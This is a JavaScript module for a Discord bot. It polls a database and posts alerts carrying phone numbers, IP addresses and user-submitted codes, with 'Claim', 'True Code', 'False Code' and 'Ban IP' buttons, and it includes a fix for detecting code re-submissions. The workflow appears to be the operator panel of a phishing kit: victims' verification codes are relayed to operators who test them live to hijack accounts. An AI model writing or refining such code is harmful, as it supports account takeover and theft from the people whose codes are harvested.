/**
 * polling.js — DB polling for new Discord notifications
 *
 * BUG 3 FIX: Retry detection (false_code → user re-submits code)
 *   Old: tracked lastId → same row ID never re-detected after a retry
 *   New: tracks lastUpdatedAt timestamp → any status change to 'code_submitted'
 *        triggers a new embed, including retries on the same row.
 *
 * Pending requests still use ID-based tracking (each pending = one INSERT = unique ID).
 * Code submissions use updated_at because retries UPDATE the same row.
 */

import { ButtonBuilder, ButtonStyle, ActionRowBuilder } from "discord.js";
import { CONFIG } from "./config.js";
import { getPendingRequests, getCodeSubmittedRequests } from "./database.js";
import { buildNewRequestEmbed, buildCodeSubmittedEmbed } from "./utils/embedBuilder.js";
import { claimedBy } from "./handlers/buttons.js";

const POLL_INTERVAL_MS = 5000;

// ─── State ────────────────────────────────────────────────────────────────────

/** Highest request ID seen for new pending requests. */
let lastPendingId = 0;

/**
 * Timestamp of the most recently processed code_submitted row.
 * Initialized 30 s in the past so we don't miss anything on bot restart.
 * BUG 3 FIX: using timestamp instead of ID so retries are detected.
 */
let lastCodeSubmittedAt = new Date(Date.now() - 30_000);

// ─── Helpers ──────────────────────────────────────────────────────────────────

function createBanIPButton(ip) {
    if (!ip || ip === "unknown" || ip === "null" || !ip.includes(".")) return null;
    return new ButtonBuilder()
        .setCustomId("banip_" + ip)
        .setLabel("🚫 Ban IP")
        .setStyle(ButtonStyle.Danger);
}

function getLogChannel(client) {
    if (!CONFIG.LOG_CHANNEL_ID) {
        console.warn("⚠️  LOG_CHANNEL_ID not set — use /config to set it");
        return null;
    }
    return client.channels.cache.get(CONFIG.LOG_CHANNEL_ID) || null;
}

// ─── Senders ──────────────────────────────────────────────────────────────────

async function sendNewRequest(client, row) {
    const channel = getLogChannel(client);
    if (!channel) return;

    const embed = buildNewRequestEmbed(row);
    const buttons = [
        new ButtonBuilder()
            .setCustomId("claim_" + row.phone)
            .setLabel("📋 Claim")
            .setStyle(ButtonStyle.Primary),
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);

    await channel.send({
        content: "@everyone",
        embeds: [embed],
        components: [new ActionRowBuilder().addComponents(...buttons)],
    });

    console.log("📨 New request sent to Discord:", row.phone);
}

async function sendCodeSubmitted(client, row) {
    const channel = getLogChannel(client);
    if (!channel) return;

    const embed = buildCodeSubmittedEmbed(row);
    const buttons = [
        new ButtonBuilder()
            .setCustomId("truecode_" + row.phone)
            .setLabel("✅ True Code")
            .setStyle(ButtonStyle.Success),
        new ButtonBuilder()
            .setCustomId("falsecode_" + row.phone)
            .setLabel("❌ False Code")
            .setStyle(ButtonStyle.Danger),
    ];
    const banBtn = createBanIPButton(row.ip_address);
    if (banBtn) buttons.push(banBtn);

    const claimer = claimedBy.get(row.phone);
    await channel.send({
        content: claimer ? `<@${claimer}>` : undefined,
        embeds: [embed],
        components: [new ActionRowBuilder().addComponents(...buttons)],
    });

    console.log("🔓 Code submission sent to Discord:", row.phone);
}

// ─── Poll loops ───────────────────────────────────────────────────────────────

async function pollPending(client) {
    try {
        const rows = await getPendingRequests(lastPendingId);
        for (const row of rows) {
            lastPendingId = Math.max(lastPendingId, row.id);
            await sendNewRequest(client, row);
        }
    } catch (e) {
        console.error("❌ Pending poll error:", e.message || e);
    }
}

async function pollCodeSubmitted(client) {
    try {
        // BUG 3 FIX: query by updated_at, not by id
        const rows = await getCodeSubmittedRequests(lastCodeSubmittedAt);
        if (rows.length === 0) return;

        let maxAt = lastCodeSubmittedAt;
        for (const row of rows) {
            await sendCodeSubmitted(client, row);
            const rowAt = new Date(row.updated_at);
            if (rowAt > maxAt) maxAt = rowAt;
        }

        // Advance the cursor by 1 ms to avoid re-processing the same row twice
        lastCodeSubmittedAt = new Date(maxAt.getTime() + 1);
    } catch (e) {
        console.error("❌ CodeSubmitted poll error:", e.message || e);
    }
}

// ─── Entry point ──────────────────────────────────────────────────────────────

export function startPolling(client) {
    console.log(`🔄 Polling started — interval: ${POLL_INTERVAL_MS / 1000}s`);
    setInterval(() => pollPending(client), POLL_INTERVAL_MS);
    setInterval(() => pollCodeSubmitted(client), POLL_INTERVAL_MS);
}
